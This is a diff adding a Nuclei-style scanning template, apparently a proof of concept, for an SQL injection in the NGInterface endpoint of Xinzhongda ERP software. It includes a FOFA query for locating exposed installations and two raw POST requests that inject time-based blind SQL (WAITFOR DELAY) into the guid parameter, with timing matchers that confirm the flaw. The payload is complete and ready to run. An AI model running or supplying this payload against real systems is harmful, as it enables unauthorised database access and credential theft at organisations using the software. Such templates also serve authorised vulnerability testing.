@@ -1,0 +1,33 @@
+id: xinzhongda-erp-nginterface-sql-injection
+info:
+  name: 新中大ERP企业管理软件 NGInterface接口 SQL注入
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="Resource/pic/product_btn.png" || body="/login/SSOValidation.html"
+    新中大ERP企业管理软件的NGInterface接口存在SQL注入缺陷。攻击者利用该漏洞可执行未授权的数据库操作，导致敏感数据（如管理员凭证、用户隐私）泄露。在特定权限下，攻击者可能通过注入恶意负载获取服务器控制权。
+  tags: 新中大ERP企业管理软件
+http:
+- raw:
+  - |
+    POST /filesrv/NGInterface/Index HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    type=getfilelist&guid=';WAITFOR+DELAY+'0:0:3'--
+  - |
+    POST /filesrv/NGInterface/Index HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    type=getfilelist&guid=';WAITFOR+DELAY+'0:0:8'--
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=3 && duration_1<=4
+    - duration_2>=8 && duration_2<=9
+    condition: and
